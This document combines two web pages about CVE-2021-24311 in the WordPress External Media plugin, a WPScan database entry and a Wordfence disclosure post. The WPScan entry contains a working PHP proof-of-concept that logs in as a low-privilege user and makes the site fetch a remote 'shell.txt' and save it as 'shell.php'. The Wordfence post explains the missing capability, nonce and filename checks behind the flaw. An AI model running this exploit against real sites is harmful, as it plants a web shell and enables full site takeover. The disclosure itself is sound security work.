=== Content from wpscan.com_b0026e2d_20250114_201355.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# External Media < 1.0.34 - Authenticated Arbitrary File Upload

### Description

The wp\_ajax\_upload-remote-file AJAX action of the plugin was vulnerable to arbitrary file uploads via any authenticated users.

### Proof of Concept

<?php
// Settings
$wp\_url = $argv[1];
$wp\_user = $argv[2];
$wp\_pass = $argv[3];
// Log in as subscriber
$ch = curl\_init();
$cookiejar = tempnam(sys\_get\_temp\_dir(), 'cookiejar-');
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-login.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'log' => $wp\_user,
'pwd' => $wp\_pass,
'rememberme' => 'forever',
'wp-submit' => 'Log+In',
]);
$output = curl\_exec($ch);
curl\_close($ch);
// Upload File
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-admin/admin-ajax.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'url' => 'https://EXTERNALSITEHOSTINGFILE/shell.txt',
'plugin' => 'ExternalLink',
'filename' => 'shell.php',
'caption' => '',
'referer' => '',
'action' => 'upload-remote-file'
]);
$output = curl\_exec($ch);
curl\_close($ch);
echo $output;
?>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

external-media](https://a8cteam5105.wordpress.com/plugin/external-media/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.0.34

### References

CVE
[CVE-2021-24311](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24311)

URL
<https://www.wordfence.com/blog/2021/05/critical-vulnerability-patched-in-external-media-plugin/>

### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
Yes

WPVDB ID
[4fb90999-6f91-4200-a0cc-bfe9b34a5de9](https://a8cteam5105.wordpress.com/vulnerability/4fb90999-6f91-4200-a0cc-bfe9b34a5de9/)

### Timeline

Publicly Published
2021-05-13 (about 3 years ago)

Added
2021-05-13 (about 3 years ago)

Last Updated
2021-05-14 (about 3 years ago)

### Other

Published
Title

Published
2024-12-30
Title
[ACF City Selector < 1.15.0 - Authenticated (Admin+) Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/8eaa590d-8b0e-44f1-9cd8-b324506445d0/)

Published
2014-08-01
Title
[Pica Photo Gallery - Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/e3564fae-10ac-4aa6-aa95-845a206c3ea6/)

Published
2016-09-26
Title
[W3 Total Cache < 0.9.5 – Authenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/666d4a0d-f925-4582-b621-1c913dffb894/)

Published
2023-10-09
Title
[Royal Elementor Addons and Templates < 1.3.79 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/281518ff-7816-4007-b712-63aed7828b34/)

Published
2022-11-28
Title
[SEO Plugin by Squirrly SEO < 12.1.11 - Contributor+ Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/e2255b66-d949-4175-9d53-074672c67887/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from www.wordfence.com_e9c62010_20250114_201356.html ===


![](https://www.wordfence.com/wp-content/uploads/2021/05/Critical-Vulnerability-Patched-in-External-Media-Plugin.png)

[![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

May 13, 2021

# Critical Vulnerability Patched in External Media Plugin

On February 2, 2021, our Threat Intelligence team responsibly disclosed the details of a vulnerability in [External Media](https://wordpress.org/plugins/external-media/), a WordPress plugin used by over 8,000 sites. This flaw made it possible for authenticated users, such as subscribers, to upload arbitrary files on any site running the plugin. This vulnerability could be used to achieve remote code execution and take over a WordPress site.

We initially reached out to the plugin’s developer on February 2, 2021. After establishing an appropriate communication channel, we provided the full disclosure the same day. After several minor patches and follow-ups with the developer, a fully patched version was released as version 1.0.34.

This is considered a critical vulnerability. Therefore, we highly recommend updating to the latest patched version available, 1.0.34, immediately.

Wordfence Premium users received a firewall rule to protect against any exploits targeting this vulnerability on February 2, 2021. Sites still using the free version of Wordfence received the same protection on March 4, 2021.

**Description:** Authenticated Arbitrary File Upload and Remote Code Execution

**Affected Plugin:** External Media

**Plugin Slug:** external-media

**Affected Versions:** <= 1.0.33

**CVE ID:** [CVE-2021-24311](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24311)

**CVSS Score:** 9.9 (Critical)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 1.0.34

External Media is a WordPress plugin designed to allow users to upload media files from external sources. Unfortunately, the plugin had a flaw that made it possible for authenticated low-level users like subscribers to upload PHP files from external sources. Any site allowing anyone to register as a subscriber was particularly vulnerable.

The plugin registered an AJAX action, `wp_ajax_upload-remote-file`, that was tied to the `upload_remote_file` function. This function was used to obtain the remote file’s name, URL, and caption, in addition to a few other fields.

```
public function upload_remote_file() {
  $file = $_POST['url'];
  $plugin = $_POST['plugin'];
  $filename = $_POST['filename'];
  $caption = !empty($_POST['caption']) ? $_POST['caption'] : '';
  $referer = !empty($_POST['referer']) ? $_POST['referer'] : '';
  $loaded_plugin = $this->load_plugin( $plugin );
  $this->_call_class_method( $loaded_plugin['phpClassName'], 'download', array( $file, $filename, $caption, $referer ) );
  }
```

This information was used to load a “plugin” method to upload a file, and then trigger the `download` function which ultimately triggered the file upload function `save_remote_file` that saved the remote file to the server.

Unfortunately, there were no capability checks that verified if a user had the appropriate capabilities to upload a file, which allowed any user logged in the WordPress site running the plugin to upload files using the external media functionality. There were also no nonce checks, making it possible for an attacker to exploit this functionality using a cross-site request forgery attack.

In addition to missing capability and nonce checks, there was no validation on the filename that was being uploaded, which made it possible to set a PHP file extension. This effectively allowed authenticated users to upload PHP files to a vulnerable site that could be used for remote code execution, ultimately allowing an attacker to completely take over a vulnerable WordPress site.

## Disclosure Timeline

**February 2, 2021** – Conclusion of the plugin analysis that led to the discovery of a vulnerability in the External Media plugin. We develop a firewall rule to protect Wordfence customers and release it to Wordfence Premium users prior to initiating contact with the plugin’s developer.

**February 2, 2021** – The plugin’s developer confirms the inbox for handling discussion. We send over full disclosure.

**February 15, 2021** – A newly updated version of External Media is released containing a partial patch. We inform the developer of additional enhancements that are required.

**February 15, 2021 – May 5, 2021** – Several follow-ups with the developer who remains in contact with us. A few partial patches are released during this time.

**March 4, 2021** – Free Wordfence users receive firewall rules.

**May 5, 2021** – Fully patched version of the plugin is released.

## Conclusion

In today’s post, we detailed a flaw in External Media that granted authenticated attackers the ability to upload arbitrary files onto a vulnerable site’s server and achieve remote code execution. This flaw has been fully patched in version 1.0.34. We recommend that all users immediately update to the latest version available, which is version 1.0.34 at the time of this publication.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210513&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users received firewall rules protecting against this vulnerability on February 2, 2021, while those still using the free version of Wordfence received the same protection on March 4, 2021.

If you know a friend or colleague who is using this plugin on their site, we highly recommend forwarding this advisory to them to help keep their sites protected as this is a critical vulnerability that can lead to full site takeover.

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F05%2Fcritical-vulnerability-patched-in-external-media-plugin%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F05%2Fcritical-vulnerability-patched-in-external-media-plugin%2F&text=Critical%20Vulnerability%20Patched%20in%20External%20Media%20Plugin&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F05%2Fcritical-vulnerability-patched-in-external-media-plugin%2F)

## Comments

2 Comments

* ![](https://secure.gravatar.com/avatar/1f2188cd39c4e514ebcb7916e0bf4f2f?s=96&d=mm&r=g)
  JACK W SMITH
  May 13, 2021
   7:53 am

  Way to go Wordfence team! You guys are outstanding in helping to protect sites!
* ![](https://secure.gravatar.com/avatar/2cb878dafeda1d402136eca27953da2e?s=96&d=mm&r=g)
  Magno gomes.
  May 14, 2021
   6:18 am

  valeu pelo alerta o wordfence é muito importante para proteger os nossos sites

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save


